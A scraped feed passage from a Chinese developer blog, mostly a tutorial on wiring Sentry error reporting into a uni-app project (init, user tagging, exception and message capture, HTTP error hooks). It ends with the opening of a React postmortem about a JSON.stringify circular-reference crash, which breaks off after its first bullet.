    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'[Sentry] 已启用但 DSN 未配置，Sentry 初始化失败'</span>)
    <span class="hljs-keyword">return</span>
  }

  <span class="hljs-keyword">const</span> isAppPlatform =
    <span class="hljs-title class_">String</span>(__UNI_PLATFORM__) === <span class="hljs-string">'app'</span> || <span class="hljs-title class_">String</span>(__UNI_PLATFORM__) === <span class="hljs-string">'app-harmony'</span>

  <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">init</span>({
    <span class="hljs-attr">dsn</span>: <span class="hljs-variable constant_">VITE_SENTRY_DSN</span>,
    <span class="hljs-comment">// extraOptions 主要是解决平台差异问题的</span>
    <span class="hljs-comment">// 非 APP 平台，可以不使用</span>
    <span class="hljs-attr">extraOptions</span>: isAppPlatform
      ? {
          <span class="hljs-attr">onmemorywarning</span>: <span class="hljs-literal">false</span>,
          <span class="hljs-attr">onerror</span>: <span class="hljs-literal">false</span>,
        }
      : <span class="hljs-literal">undefined</span>,
  })
}

<span class="hljs-comment">/**
 * 设置 Sentry 用户信息
 * 保留此函数，因为 src/stores/user.ts 中需要使用
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">setSentryUser</span>(<span class="hljs-params">userInfo?: { id?: <span class="hljs-built_in">string</span>; username?: <span class="hljs-built_in">string</span> }</span>) {
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isSentryEnabled</span>()) <span class="hljs-keyword">return</span>

  <span class="hljs-keyword">if</span> (userInfo?.<span class="hljs-property">id</span> &amp;&amp; userInfo?.<span class="hljs-property">username</span>) {
    <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">configureScope</span>(<span class="hljs-function"><span class="hljs-params">scope</span> =&gt;</span> {
      scope.<span class="hljs-title function_">setUser</span>({
        <span class="hljs-attr">id</span>: <span class="hljs-title class_">String</span>(userInfo.<span class="hljs-property">id</span>), <span class="hljs-comment">// 确保 id 是字符串</span>
        <span class="hljs-attr">username</span>: userInfo.<span class="hljs-property">username</span>,
      })
    })
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">configureScope</span>(<span class="hljs-function"><span class="hljs-params">scope</span> =&gt;</span> {
      scope.<span class="hljs-title function_">setUser</span>(<span class="hljs-literal">null</span>)
    })
  }
}

<span class="hljs-comment">/**
 * 捕获异常
 * 在 App.vue 的 onError 中调用
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">captureException</span>(<span class="hljs-params">error: <span class="hljs-built_in">unknown</span>, extra?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;</span>) {
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isSentryEnabled</span>()) <span class="hljs-keyword">return</span>

  <span class="hljs-comment">// 使用 withScope 确保额外信息能够正确附加</span>
  <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">withScope</span>(<span class="hljs-function"><span class="hljs-params">scope</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (extra) {
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(extra).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
        scope.<span class="hljs-title function_">setExtra</span>(key, extra[key])
      })
    }
    <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">captureException</span>(error)
  })
}

<span class="hljs-comment">/**
 * 捕获消息
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">captureMessage</span>(<span class="hljs-params">message: <span class="hljs-built_in">string</span>, extra?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;</span>) {
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isSentryEnabled</span>()) <span class="hljs-keyword">return</span>

  <span class="hljs-comment">// 使用 withScope 确保额外信息（包括 traceId）能够正确附加</span>
  <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">withScope</span>(<span class="hljs-function"><span class="hljs-params">scope</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (extra) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'extra'</span>, extra)
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(extra).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
        scope.<span class="hljs-title function_">setExtra</span>(key, extra[key])
      })
    }
    <span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">captureMessage</span>(message)
  })
}

<span class="hljs-comment">// 导出 Sentry 对象，以便在需要时直接使用</span>
<span class="hljs-keyword">export</span> { <span class="hljs-title class_">Sentry</span> }
</code></pre>
<p><strong>代码说明</strong>：</p>
<ol>
<li>
<p><strong><code>isSentryEnabled()</code></strong>: 检查是否启用 Sentry，必须同时满足 <code>profile.SENTRY_ENABLE === true</code> 和 <code>VITE_SENTRY_DSN</code> 已配置</p>
</li>
<li>
<p><strong><code>initSentry()</code></strong>: 初始化 Sentry</p>
<ul>
<li>检查启用开关和 DSN 配置</li>
<li>APP 平台需要特殊配置 <code>extraOptions</code> 来禁用某些钩子，避免与 <code>App.onError</code> 冲突</li>
</ul>
</li>
<li>
<p><strong><code>setSentryUser()</code></strong>: 设置或清除 Sentry 用户信息</p>
<ul>
<li>用于关联错误和用户，便于问题追踪</li>
<li>登出时传入 <code>undefined</code> 清除用户信息</li>
</ul>
</li>
<li>
<p><strong><code>captureException()</code></strong>: 捕获异常</p>
<ul>
<li>用于真正的异常（网络错误、代码错误等）</li>
<li>支持附加额外上下文信息</li>
</ul>
</li>
<li>
<p><strong><code>captureMessage()</code></strong>: 捕获消息</p>
<ul>
<li>用于业务逻辑错误（错误码等，不是异常）</li>
<li>支持附加额外上下文信息</li>
</ul>
</li>
<li>
<p><strong>导出 Sentry 对象</strong>: 允许在特殊场景下直接使用 Sentry 的原生 API</p>
</li>
</ol>
<hr/>
<h3 data-id="heading-10">初始化流程</h3>
<h4 data-id="heading-11">App.vue 中的初始化</h4>
<p>在 <code>src/App.vue</code> 的 <code>onLaunch</code> 钩子中初始化 Sentry：</p>
<pre><code class="hljs language-87:111:src/App.vue" lang="87:111:src/App.vue">onLaunch(() =&gt; {
  console.log('App Launch')

  // 初始化 Sentry
  initSentry()

  // 安全初始化埋点SDK（内部会等待 App 实例准备好）
  safeInitTrack()

  // 延迟检查和测试（给足够时间让埋点初始化完成）
  setTimeout(() =&gt; {
    if (checkTrackInit()) {
      // 开发环境下测试埋点
      if (import.meta.env.MODE === 'dev') {
        testTrack()
      }
    }

    // 设置 Sentry 用户信息
    const userStore = useUserStore()
    const { userId, username } = userStore.userInfo || {}
    if (userId &amp;&amp; username) {
      setSentryUser({ id: userId, username })
    }
  }, 3500) // 增加到 3.5 秒，确保 waitForAppReady 完成
</code></pre>
<h4 data-id="heading-12">全局错误捕获</h4>
<p>在 <code>src/App.vue</code> 的 <code>onError</code> 钩子中捕获全局异常：</p>
<pre><code class="hljs language-146:155:src/App.vue" lang="146:155:src/App.vue">// sentry-uniapp 内部是通过 uni.onError 钩子函数捕获错误的
// 但目前 uni.onError 暂不支持 App (android / ios)，各平台支持情况参考：
// https://uniapp.dcloud.net.cn/api/application.html#onerror
//
// 通用方案：
// 可用 App.onError 自己处理，但需要先禁用 sentry 里的捕获
// 方法在 sentry.init 参数里加上 extraOptions: { onerror: false }
onError((error: unknown) =&gt; {
  captureException(error)
})
</code></pre>
<p><strong>注意</strong>：</p>
<ul>
<li><code>sentry-uniapp</code> 内部通过 <code>uni.onError</code> 钩子捕获错误</li>
<li>但 <code>uni.onError</code> 暂不支持 APP 平台（Android/iOS）</li>
<li>APP 平台需要在 <code>sentry.init</code> 中配置 <code>extraOptions: { onerror: false }</code>，然后使用 <code>App.onError</code> 手动捕获</li>
</ul>
<hr/>
<h3 data-id="heading-13">使用方式</h3>
<h4 data-id="heading-14">1. 导入函数</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { captureException, captureMessage, setSentryUser } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/sentry'</span>
</code></pre>
<h4 data-id="heading-15">2. 捕获异常</h4>
<p>用于捕获真正的异常（如网络错误、代码错误等）：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">try</span> {
  <span class="hljs-comment">// 可能出错的代码</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">someAsyncOperation</span>()
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-title function_">captureException</span>(error, {
    <span class="hljs-comment">// 可选的额外信息</span>
    <span class="hljs-attr">operation</span>: <span class="hljs-string">'someOperation'</span>,
    <span class="hljs-attr">userId</span>: <span class="hljs-string">'123'</span>,
  })
}
</code></pre>
<h4 data-id="heading-16">3. 捕获业务错误</h4>
<p>用于捕获业务逻辑返回的错误（不是异常，而是业务错误码）：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">apiCall</span>()
<span class="hljs-keyword">if</span> (!response.<span class="hljs-property">succeed</span>) {
  <span class="hljs-title function_">captureMessage</span>(<span class="hljs-string">`业务返回错误码: <span class="hljs-subst">${response.code}</span>`</span>, {
    <span class="hljs-attr">errorCode</span>: response.<span class="hljs-property">code</span>,
    <span class="hljs-attr">traceId</span>: response.<span class="hljs-property">traceId</span>,
    <span class="hljs-attr">url</span>: <span class="hljs-string">'/api/endpoint'</span>,
  })
}
</code></pre>
<h4 data-id="heading-17">4. 设置用户信息</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 设置用户信息</span>
<span class="hljs-title function_">setSentryUser</span>({ <span class="hljs-attr">id</span>: <span class="hljs-string">'123'</span>, <span class="hljs-attr">username</span>: <span class="hljs-string">'john_doe'</span> })

<span class="hljs-comment">// 清除用户信息（登出时）</span>
<span class="hljs-title function_">setSentryUser</span>()
</code></pre>
<hr/>
<h3 data-id="heading-18">错误上报场景</h3>
<h4 data-id="heading-19">1. HTTP 请求错误上报</h4>
<p>在 <code>src/service/index.ts</code> 中，HTTP 请求拦截器会自动上报错误：</p>
<h5 data-id="heading-20">业务错误上报（使用 captureMessage）</h5>
<pre><code class="hljs language-14:25:src/service/index.ts" lang="14:25:src/service/index.ts">function reportBusinessErrorToSentry(
  message: string,
  requestOptions: CustomRequestOptions,
  extra?: Record&lt;string, unknown&gt;,
): void {
  captureMessage(message, {
    url: requestOptions.url,
    method: requestOptions.method || 'GET',
    requestParams: requestOptions.data || requestOptions.query || {},
    ...extra,
  })
}
</code></pre>
<p><strong>使用场景</strong>：</p>
<pre><code class="hljs language-48:55:src/service/index.ts" lang="48:55:src/service/index.ts">function handleBusinessError&lt;T&gt;(data: BaseRes&lt;T&gt;, requestOptions: CustomRequestOptions): boolean {
  globalErrorMonitor.handleError(data.code, data)
  // 业务错误使用 captureMessage（不是异常，是业务逻辑返回的错误）
  reportBusinessErrorToSentry(`业务返回错误码: ${data.code}`, requestOptions, {
    errorCode: data.code,
    traceId: data.traceId,
    errorData: data,
  })
</code></pre>
<h5 data-id="heading-21">HTTP 错误上报（使用 captureException）</h5>
<pre><code class="hljs language-30:42:src/service/index.ts" lang="30:42:src/service/index.ts">function reportExceptionToSentry(
  message: string,
  requestOptions: CustomRequestOptions,
  extra?: Record&lt;string, unknown&gt;,
): void {
  const error = new Error(message)
  captureException(error, {
    url: requestOptions.url,
    method: requestOptions.method || 'GET',
    requestParams: requestOptions.data || requestOptions.query || {},
    ...extra,
  })
}
</code></pre>
<p><strong>使用场景</strong>：</p>
<pre><code class="hljs language-75:85:src/service/index.ts" lang="75:85:src/service/index.ts">function handleHttpError&lt;T&gt;(
  statusCode: number,
  data: BaseRes&lt;T&gt;,
  requestOptions: CustomRequestOptions,
): void {
  const message = data.message || (statusCode === 401 ? '未授权' : '请求错误')
  // HTTP 错误使用 captureException（是真正的异常）
  reportExceptionToSentry(`HTTP ${statusCode}: ${message}`, requestOptions, {
    statusCode,
    errorData: data,
  })
</code></pre>
<h5 data-id="heading-22">网络错误上报（使用 captureException）</h5>
<pre><code class="hljs language-95:100:src/service/index.ts" lang="95:100:src/service/index.ts">function handleNetworkError&lt;T&gt;(err: unknown, requestOptions: CustomRequestOptions): BaseRes&lt;T&gt; {
  uni.showToast({ icon: 'none', title: '网络错误，换个网络试试' })

  const errorMessage = typeof err === 'string' ? err : JSON.stringify(err)
  // 网络错误使用 captureException（是真正的异常）
  reportExceptionToSentry(`网络请求失败: ${errorMessage}`, requestOptions, { errorData: err })
</code></pre>
<h4 data-id="heading-23">2. 全局错误监控</h4>
<p>在 <code>src/utils/globalErrorMonitor.ts</code> 中，未处理的错误码会统一上报到 Sentry：</p>
<pre><code class="hljs language-28:37:src/utils/globalErrorMonitor.ts" lang="28:37:src/utils/globalErrorMonitor.ts">  public handleError(errCode: string, errorData?: any): void {
    switch (errCode) {
      case 'ACOM10000':
        this.handlePermissionUpdated()
        break
      // 可以添加其他错误码的处理
      default:
        // 未处理的错误码已在 service/index.ts 中统一上报到 Sentry
        break
    }
  }
</code></pre>
<hr/>
<h3 data-id="heading-24">用户信息关联</h3>
<h4 data-id="heading-25">自动设置用户信息</h4>
<p>在用户登录或获取用户信息后，自动设置 Sentry 用户信息：</p>
<h5 data-id="heading-26">1. App.vue 中初始化时设置</h5>
<pre><code class="hljs language-105:110:src/App.vue" lang="105:110:src/App.vue">    // 设置 Sentry 用户信息
    const userStore = useUserStore()
    const { userId, username } = userStore.userInfo || {}
    if (userId &amp;&amp; username) {
      setSentryUser({ id: userId, username })
    }
</code></pre>
<h5 data-id="heading-27">2. User Store 中设置</h5>
<p>在 <code>src/stores/user.ts</code> 中，设置用户信息时自动关联 Sentry：</p>
<pre><code class="hljs language-23:32:src/stores/user.ts" lang="23:32:src/stores/user.ts">    const setUserInfo = (val: UserModel) =&gt; {
      userInfo.value = val
      // 设置 Sentry 用户信息
      if (val.userId &amp;&amp; val.username) {
        setSentryUser({
          id: val.userId,
          username: val.username,
        })
      }
    }
</code></pre>
<h5 data-id="heading-28">3. 清除用户信息</h5>
<p>登出时清除 Sentry 用户信息：</p>
<pre><code class="hljs language-44:51:src/stores/user.ts" lang="44:51:src/stores/user.ts">    const clearAll = () =&gt; {
      userInfo.value = { ...initState }
      companyInfo.value = {}
      realNameInfo.value = {}
      hasCompanyList.value = false
      // 清除 Sentry 用户信息
      setSentryUser()
    }
</code></pre>
<hr/>
<h3 data-id="heading-29">平台差异说明</h3>
<h4 data-id="heading-30">APP 平台特殊配置</h4>
<p>APP 平台（Android/iOS）需要在初始化时禁用某些钩子，避免与 <code>App.onError</code> 冲突：</p>
<pre><code class="hljs language-31:44:src/sentry.ts" lang="31:44:src/sentry.ts">  const isAppPlatform =
    String(__UNI_PLATFORM__) === 'app' || String(__UNI_PLATFORM__) === 'app-harmony'

  Sentry.init({
    dsn: VITE_SENTRY_DSN,
    // extraOptions 主要是解决平台差异问题的
    // 非 APP 平台，可以不使用
    extraOptions: isAppPlatform
      ? {
          onmemorywarning: false,
          onerror: false,
        }
      : undefined,
  })
</code></pre>
<p><strong>原因</strong>：</p>
<ul>
<li><code>uni.onError</code> 在 APP 平台不支持</li>
<li>需要在 <code>App.onError</code> 中手动捕获错误</li>
<li>因此需要禁用 Sentry 内部的 <code>onerror</code> 钩子</li>
</ul>
<h4 data-id="heading-31">平台支持情况</h4>
<p>参考 <a href="https://link.juejin.cn?target=https%3A%2F%2Funiapp.dcloud.net.cn%2Fapi%2Fapplication.html%23onerror" target="_blank" title="https://uniapp.dcloud.net.cn/api/application.html#onerror" ref="nofollow noopener noreferrer">uni-app 官方文档</a>：</p>
<ul>
<li>✅ H5: 支持 <code>uni.onError</code></li>
<li>✅ 小程序: 支持 <code>uni.onError</code></li>
<li>❌ APP: 不支持 <code>uni.onError</code>，需要使用 <code>App.onError</code></li>
</ul>
<hr/>
<h3 data-id="heading-32">总结</h3>
<h4 data-id="heading-33">配置检查清单</h4>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 在 <code>.env</code> 文件中配置 <code>VITE_SENTRY_DSN</code></li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 在 <code>env-conf.ts</code> 中配置各环境的 <code>SENTRY_ENABLE</code></li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 确保 <code>src/App.vue</code> 中调用了 <code>initSentry()</code></li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 确保 <code>src/App.vue</code> 中配置了 <code>onError</code> 钩子</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 确保用户登录后调用了 <code>setSentryUser()</code></li>
</ul>
<h4 data-id="heading-34">最佳实践</h4>
<ol>
<li>
<p><strong>异常 vs 业务错误</strong>：</p>
<ul>
<li>真正的异常（网络错误、代码错误）使用 <code>captureException</code></li>
<li>业务逻辑错误（错误码）使用 <code>captureMessage</code></li>
</ul>
</li>
<li>
<p><strong>用户信息关联</strong>：</p>
<ul>
<li>登录后立即设置用户信息</li>
<li>登出时清除用户信息</li>
</ul>
</li>
<li>
<p><strong>额外信息</strong>：</p>
<ul>
<li>上报时尽量提供上下文信息（URL、参数、traceId 等）</li>
<li>便于在 Sentry 后台快速定位问题</li>
</ul>
</li>
<li>
<p><strong>环境控制</strong>：</p>
<ul>
<li>开发环境可以启用，方便调试</li>
<li>测试环境建议关闭，避免测试数据污染</li>
<li>生产环境必须启用，用于监控线上问题</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-35">相关文件清单</h3>
<ul>
<li><code>src/sentry.ts</code> - Sentry 核心配置和工具函数</li>
<li><code>src/App.vue</code> - Sentry 初始化和全局错误捕获</li>
<li><code>src/service/index.ts</code> - HTTP 请求错误上报</li>
<li><code>src/stores/user.ts</code> - 用户信息关联</li>
<li><code>env-conf.ts</code> - 环境配置（Sentry 开关）</li>
<li><code>typings/env.d.ts</code> - 环境变量类型定义</li>
<li><code>package.json</code> - 依赖包配置</li>
</ul>
<hr/>
<p><strong>文档更新时间</strong>: 2025-01-24</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 项目诡异白屏事故复盘：JSON.stringify、循环引用、setState 死循环，一个都没跑]]></title>    <link>https://juejin.cn/post/7575469988738007049</link>    <guid>https://juejin.cn/post/7575469988738007049</guid>    <pubDate>2025-11-24T03:41:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575469988738007049" data-draft-id="7575412016405397514" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 项目诡异白屏事故复盘：JSON.stringify、循环引用、setState 死循环，一个都没跑"/> <meta itemprop="keywords" content="前端,Debug"/> <meta itemprop="datePublished" content="2025-11-24T03:41:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="vim怎么退出"/> <meta itemprop="url" content="https://juejin.cn/user/3408900584639341"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 项目诡异白屏事故复盘：JSON.stringify、循环引用、setState 死循环，一个都没跑
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3408900584639341/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    vim怎么退出
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:41:54.000Z" title="Mon Nov 24 2025 03:41:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;position:relative;background-image:linear-gradient(90deg,rgba(217,234,251,.25) 3%,transparent 0),linear-gradient(1turn,rgba(217,234,251,.25) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;padding-left:8px;padding-bottom:0;margin-top:35px;margin-bottom:10px;font-weight:900;font-family:serif;letter-spacing:1px;color:#000}.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover{background-color:#fff}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;position:relative}.markdown-body h2:after{content:"";left:0;bottom:0;width:100%;height:1px;position:absolute}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{height:1px;border:none;margin-top:32px;margin-bottom:32px;background-size:4px 1px;background-image:linear-gradient(270deg,#37b2ff 0,#37b2ff 25%,transparent 50%)}.markdown-body code{margin:0 4px;word-break:break-word;overflow-x:auto;background-color:#fff7f7;color:#f06;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:-apple-system,system-ui,Menlo,Monaco,Consolas,Courier New;position:relative}.markdown-body pre{margin:15px 8px;border:1px solid #f5f5f7;line-height:1.75}.markdown-body pre:before{top:-4px;left:-4px;border-top:8px solid #feea1e;border-left:8px solid #feea1e}.markdown-body pre:after,.markdown-body pre:before{width:20px;height:20px;content:"";z-index:10;position:absolute}.markdown-body pre:after{right:-4px;bottom:-4px;border-right:8px solid #37b2ff;border-bottom:8px solid #37b2ff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;overflow-x:auto;margin:0;word-break:normal;display:block;color:#333;background-color:#fff;position:unset!important}.markdown-body pre:nth-child(odd):before{border-top-color:#a7ecad;border-left-color:#a7ecad}.markdown-body pre:nth-child(odd):after{border-right-color:#e699e6;border-bottom-color:#e699e6}.markdown-body a{margin:0 4px;text-decoration:none;color:#37b2ff;transition:.3s;display:inline-block;vertical-align:bottom;position:relative}.markdown-body a:before{content:"READ MORE +";bottom:90%;width:120px;max-width:0;color:#fff;background-color:#1fb3ff;position:absolute;white-space:nowrap;transition:.3s;box-sizing:border-box;pointer-events:none;overflow:hidden}.markdown-body a:after{content:"";bottom:0;left:0;width:100%;height:1px;border-bottom:1px dashed #37b2ff;position:absolute}.markdown-body a:active:before,.markdown-body a:hover:before{max-width:120px;padding-left:14px}.markdown-body table{width:100%;max-width:100%;font-size:12px;background-color:#fff;overflow:auto;border-collapse:collapse}.markdown-body table tr:hover td,.markdown-body table tr:hover th{border-bottom:1px solid #feea1e}.markdown-body thead{text-align:left}.markdown-body th{font-size:1.2em;border-bottom:1px dashed #eee}.markdown-body tr:nth-child(2n){background-color:hsla(0,0%,87.8%,.1);border-bottom:1px solid #fff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px;border-bottom:1px dashed #fff}.markdown-body blockquote{color:#666;padding:12px 23px 2px;border:1px solid #37b2ff;background-color:#fff;margin:22px 0;position:relative}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body blockquote:after{content:"FROM";left:0;width:40px;color:#fff;background-color:#37b2ff;text-align:center}.markdown-body blockquote:after,.markdown-body blockquote:before{top:0;line-height:1;padding:2px 0;font-size:12px;font-weight:lighter;position:absolute;pointer-events:none}.markdown-body blockquote:before{content:"CITATION";left:44px;color:#37b2ff}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{line-height:2em;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#37b2ff}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol ol li,.markdown-body ol ul li,.markdown-body ul ol li,.markdown-body ul ul li{border-bottom:none}.markdown-body ol li{padding-left:6px;list-style:decimal-leading-zero}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]{position:relative}.markdown-body input[type=checkbox]:before{top:0;left:0;right:0;bottom:0;content:"";width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1;position:absolute}.markdown-body input[type=checkbox]:checked:after{content:"";top:10%;left:18%;width:90%;height:40%;border-left:2px solid #37b2ff;border-bottom:2px solid #37b2ff;color:#37b2ff;z-index:2;transform:rotate(-45deg);position:absolute}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0"><strong>一、背景：某核心模块突然白屏</strong></h2>
<p>前两周某私有云客户反馈一个关键业务页面 <strong>突然白屏</strong>，刷新浏览器会好，但是经常复现，极其影响用户操作和体验。</p>
<p>由于是私有云，并且我公有云复现不出来，于是找到用户远程看问题。</p>
<p>打开控制台一看，迎面就是一串熟悉又危险的错误：</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-type">TypeError</span>: <span class="hljs-type">Converting</span> circular structure to <span class="hljs-type">JSON</span>
    --&gt; starting at <span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-keyword">with</span> <span class="hljs-title">constructor</span> '<span class="hljs-title">Object</span>'</span>
    --- property 'xxxx' closes the circle
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6270a552e6a64b9caeb1c56b5c591634~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdmlt5oCO5LmI6YCA5Ye6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560514&amp;x-signature=zz36j0rvtEGl9cm6jckwczcamUY%3D" alt="image.png" loading="lazy"/></p>
<p>这意味着 ——<br/>
<strong>某处代码正在用 JSON.stringify 序列化一个包含循环引用的数据结构。</strong></p>
<p>问题立刻严重起来：</p>
<ul>
<li>循环引用导致 JSON.stringify 崩溃</li>
